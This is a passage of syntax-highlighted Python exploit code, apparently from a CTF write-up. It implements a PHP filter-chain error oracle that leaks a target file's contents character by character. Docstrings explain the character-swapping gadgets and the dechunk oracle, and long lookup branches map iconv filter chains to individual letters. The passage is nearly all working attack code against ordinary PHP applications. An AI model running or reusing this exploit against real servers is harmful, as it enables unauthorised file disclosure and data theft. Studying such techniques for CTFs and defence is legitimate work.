class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>),<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>)<br>]<br><span class="hljs-built_in">print</span>(j)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(j) != <span class="hljs-number">2</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">if</span> j[<span class="hljs-number">0</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span><br><span class="hljs-keyword">elif</span> j[<span class="hljs-number">1</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#x27;</span><br><span class="hljs-keyword">elif</span> j[<span class="hljs-number">2</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;j: <span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;header: <span class="hljs-subst">&#123;header&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step two:</span><br><span class="hljs-string">Now we have something of the form</span><br><span class="hljs-string">[a-zA-Z0-9 things]==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span><br><span class="hljs-string">successive characters from the start of the string to access every character. Maybe something like</span><br><span class="hljs-string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span><br><span class="hljs-string">there are filters that *swap* characters:</span><br><span class="hljs-string"></span><br><span class="hljs-string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span><br><span class="hljs-string">abcdefgh -&gt; badcfehg</span><br><span class="hljs-string"></span><br><span class="hljs-string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span><br><span class="hljs-string">abcdefgh -&gt; dcbahgfe</span><br><span class="hljs-string"></span><br><span class="hljs-string">This allows us to access the first four characters of the string. Can we do better? It turns out</span><br><span class="hljs-string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of</span><br><span class="hljs-string">the string:</span><br><span class="hljs-string"></span><br><span class="hljs-string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span><br><span class="hljs-string"></span><br><span class="hljs-string">The idea being that if we now use the r4 gadget, we get something like:</span><br><span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span><br><span class="hljs-string"></span><br><span class="hljs-string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span><br><span class="hljs-string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span><br><span class="hljs-string">bafedc</span><br><span class="hljs-string"></span><br><span class="hljs-string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th</span><br><span class="hljs-string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span><br><span class="hljs-string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span><br><span class="hljs-string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no</span><br><span class="hljs-string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it</span><br><span class="hljs-string">turns out, if we apply the filter</span><br><span class="hljs-string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span><br><span class="hljs-string"></span><br><span class="hljs-string">It will turn the == into:</span><br><span class="hljs-string">+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">And this is magic, because this corrects such that when we apply the</span><br><span class="hljs-string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Let&#x27;s recap. We have a string like:</span><br><span class="hljs-string">abcdefghij==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span><br><span class="hljs-string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span><br><span class="hljs-string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply r4 gadget:</span><br><span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span><br><span class="hljs-string">bafedcjihg+0DAD3D3+0DAD3Dw==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Then apply r4 once more:</span><br><span class="hljs-string">efabijcd0+gh3DAD0+3D3DAD==wD</span><br><span class="hljs-string"></span><br><span class="hljs-string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span><br><span class="hljs-string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span><br><span class="hljs-string">want, to access all the characters in the string ;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>flip = <span class="hljs-string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span><br>r2 = <span class="hljs-string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span><br>r4 = <span class="hljs-string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_nth</span>(<span class="hljs-params">n</span>):<br><span class="hljs-keyword">global</span> flip, r2, r4<br>o = []<br>chunk = n // <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> chunk % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>: o.append(r4)<br>o.extend([flip, r4] * (chunk // <span class="hljs-number">2</span>))<br><span class="hljs-keyword">if</span> (n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) ^ (chunk % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>): o.append(r2)<br><span class="hljs-keyword">return</span> join(*o)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step 3:</span><br><span class="hljs-string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span><br><span class="hljs-string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span><br><span class="hljs-string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span><br><span class="hljs-string">I just bruteforced every combination of iconv filters to find these.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span><br><span class="hljs-string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually </span><br><span class="hljs-string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span><br><span class="hljs-string">string to figure out which number it is.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>rot1 = <span class="hljs-string">&#x27;convert.iconv.437.CP930&#x27;</span><br>be = <span class="hljs-string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#x27;</span><br>o = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_letter</span>(<span class="hljs-params">prefix</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># a-f A-F 0-9</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># a-e</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;edcba&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># A-E</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;EDCBA&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;*&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># f</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;f&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># F</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;F&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># n-s N-S</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># n-r</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;rqpon&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># N-R</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;RQPON&#x27;</span>[n]<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># s</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;s&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># S</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;S&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># i j k</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;k&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;j&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;i&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># I J K</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;K&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;J&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;I&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># v w x</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;x&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;w&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;v&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># V W X</span><br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;X&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;W&#x27;</span><br><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;V&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># Z</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Z&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># z</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;z&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># M</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;M&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># m</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;m&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># y</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;y&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># Y</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Y&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># l</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;l&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># L</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;L&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># h</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;h&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># H</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;H&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># u</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;u&#x27;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># U</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;U&#x27;</span><br><span 